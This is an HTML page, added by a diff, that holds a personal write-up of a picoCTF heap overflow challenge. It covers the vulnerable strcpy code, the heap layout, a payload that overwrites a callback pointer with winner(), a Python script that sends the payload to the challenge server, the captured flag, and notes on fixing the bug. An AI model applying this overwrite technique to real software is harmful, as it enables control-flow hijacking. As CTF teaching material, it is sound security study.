@@ -1,0 +1,110 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>picoCTF — Heap Overflow (ctfaa) — arwah</title><meta name="description" content="strcpy into i1-&gt;name (a malloc(8)) has no bounds check. Heap chunks are allocated sequentially, so a long argv[1] walks straight out of the name chunk and into the i2 struct that sits…"><link rel="icon" href="/favicon.svg"><link rel="stylesheet" href="/writeups/writeups.css?v=20261019-2"></head><body><header class="library-nav"><a href="/#writeups">← Portfolio</a><a href="/writeups/">Writeup library</a></header><main><div class="article-meta">Binary Exploitation · 3 min read</div><details class="contents"><summary>On this page</summary><ul><li><a href="#the-bug">The bug</a></li><li><a href="#heap-layout-32-bit-glibc-verified-in-gdb">Heap layout (32-bit glibc, verified in gdb)</a></li><li><a href="#exploit">Exploit</a></li><li><a href="#solution-script">Solution script</a></li><li><a href="#debugging-gotchas-cost-me-the-most-time">Debugging gotchas (cost me the most time)</a></li><li><a href="#takeaways">Takeaways</a></li></ul></details><article class="prose"><h1 id="picoctf-heap-overflow-ctfaa">picoCTF — Heap Overflow (ctfaa)</h1>
+<p><strong>Flag:</strong> <code>picoCTF{h34p_0v3rfl0w_b59f3184}</code>
+<strong>Remote:</strong> <code>nc foggy-cliff.picoctf.net 65277</code>
+<strong>Files:</strong> <code>vuln</code> (32-bit ELF, no PIE, not stripped), <code>vuln.c</code></p>
+<h2 id="the-bug">The bug</h2>
+<pre><code class="language-c">struct internet {
+    int priority;
+    char *name;
+    void (*callback)();
+};
+
+i1 = malloc(sizeof(struct internet));   // 12 bytes
+i1-&gt;name = malloc(8);
+i2 = malloc(sizeof(struct internet));
+i2-&gt;name = malloc(8);
+
+strcpy(i1-&gt;name, argv[1]);   // &lt;-- unbounded copy into an 8-byte heap chunk
+strcpy(i2-&gt;name, argv[2]);
+
+if (i1-&gt;callback) i1-&gt;callback();
+if (i2-&gt;callback) i2-&gt;callback();
+</code></pre>
+<p><code>strcpy</code> into <code>i1-&gt;name</code> (a <code>malloc(8)</code>) has no bounds check. Heap chunks are
+allocated sequentially, so a long <code>argv[1]</code> walks straight out of the name
+chunk and into the <code>i2</code> struct that sits directly after it — including its
+<code>callback</code> function pointer, which is then called.</p>
+<h2 id="heap-layout-32-bit-glibc-verified-in-gdb">Heap layout (32-bit glibc, verified in gdb)</h2>
+<p>The binary prints and flushes before mallocing, so the stdout buffer
+(malloc(0x1000)) is allocated first. Subsequent chunks, relative to
+<code>i1-&gt;name</code>'s data:</p>
+<pre><code>i1-&gt;name data   +0x00   (usable 16 bytes: 8 data + prev_size reuse)
+i2-&gt;priority    +0x10
+i2-&gt;name        +0x14
+i2-&gt;callback    +0x18
+</code></pre>
+<p>Offsets are stable across runs even though the heap <em>base</em> is randomized
+(brk ASLR) — only relative layout matters.</p>
+<h2 id="exploit">Exploit</h2>
+<p><code>argv[1]</code> = 28 bytes, NULL-free:</p>
+<pre><code>'A' * 20                    # filler up to i2 struct
+p32(0x0804c048)             # i2-&gt;name  -&gt; writable .bss/data page
+p32(0x080492b6)             # i2-&gt;callback -&gt; winner()
+</code></pre>
+<p>Details that matter:</p>
+<ul>
+<li><strong><code>i2-&gt;name</code> must be a valid writable pointer.</strong> <code>strcpy(i2-&gt;name, argv[2])</code>
+runs <em>after</em> the overflow, so whatever bytes land at <code>+0x14</code> get used as the
+write destination. It cannot point at the heap (base is randomized), so it
+points at the binary's data segment instead — fixed at <code>0x0804c0xx</code> because
+the binary is not PIE.</li>
+<li><strong>Payload must be NULL-free.</strong> <code>strcpy</code> stops at the first NUL, and the
+addresses <code>0x0804c048</code> / <code>0x080492b6</code> (little-endian <code>48 c0 04 08</code>,
+<code>b6 92 04 08</code>) conveniently contain none.</li>
+<li><code>i1-&gt;callback</code> is untouched (still NULL), so control flows to the
+<code>i2-&gt;callback()</code> check, which now holds <code>winner</code> and prints <code>flag.txt</code>.</li>
+</ul>
+<h2 id="solution-script">Solution script</h2>
+<pre><code class="language-python">#!/usr/bin/env python3
+import os, struct, sys
+
+WINNER   = 0x080492b6
+WRITABLE = 0x0804c048
+
+payload = b'A'*20 + struct.pack('&lt;I', WRITABLE) + struct.pack('&lt;I', WINNER)
+assert b'\x00' not in payload
+
+# remote version:
+import socket, time
+s = socket.create_connection(('foggy-cliff.picoctf.net', 65277), timeout=15)
+time.sleep(1)
+s.sendall(payload + b' ' + b'AAA\n')
+s.settimeout(10)
+data = b''
+try:
+    while (c := s.recv(4096)):
+        data += c
+except socket.timeout:
+    pass
+print(data.decode('latin1', 'replace'))
+</code></pre>
+<p>Output:</p>
+<pre><code>Enter two names separated by space:
+FLAG: picoCTF{h34p_0v3rfl0w_b59f3184}
+</code></pre>
+<h2 id="debugging-gotchas-cost-me-the-most-time">Debugging gotchas (cost me the most time)</h2>
+<ol>
+<li><strong>gdb mangles non-ASCII argv.</strong> gdb converts arguments through the host
+charset, so byte <code>0xc0</code> became <code>0xc3 0x80</code> (UTF-8 for <code>À</code>), silently
+corrupting the written address. Any exploit payload passed to gdb's <code>run</code>
+gets mangled — dump/verify the actual bytes the program receives instead.</li>
+<li><strong>Python re-encodes <code>str</code> argv to UTF-8.</strong> Passing the payload as a
+<code>latin1</code>-decoded <code>str</code> to <code>subprocess</code>/<code>os.execve</code> corrupts it the same
+way. Pass raw <code>bytes</code> (<code>os.execve</code> with a <code>bytes</code> argv) — NUL-free bytes
+are fine, only embedded NULs are rejected.</li>
+<li><strong>gdb disables ASLR by default.</strong> The exploit worked under gdb with a
+hardcoded heap address but segfaulted outside; the fix was to stop using
+heap pointers entirely (point <code>i2-&gt;name</code> at fixed .bss) and keep only
+relative chunk offsets.</li>
+</ol>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li>Sequential heap allocations + unbounded <code>strcpy</code> = overwrite of the next
+chunk's metadata <em>and</em> data (classic &quot;heap overflow 0&quot; style, similar to
+picoCTF's <code>heap0</code>).</li>
+<li>Function pointers inside structs immediately after an overflowable buffer
+are a direct control-flow hijack primitive.</li>
+<li>Use <code>snprintf</code>/<code>strncpy</code>/length checks; never <code>strcpy</code> attacker input into
+a fixed heap allocation.</li>
+</ul>
+</article><a class="back-link" href="/writeups/">← All writeups</a></main><footer>CTF solutions &amp; security notes · arwah</footer></body></html>
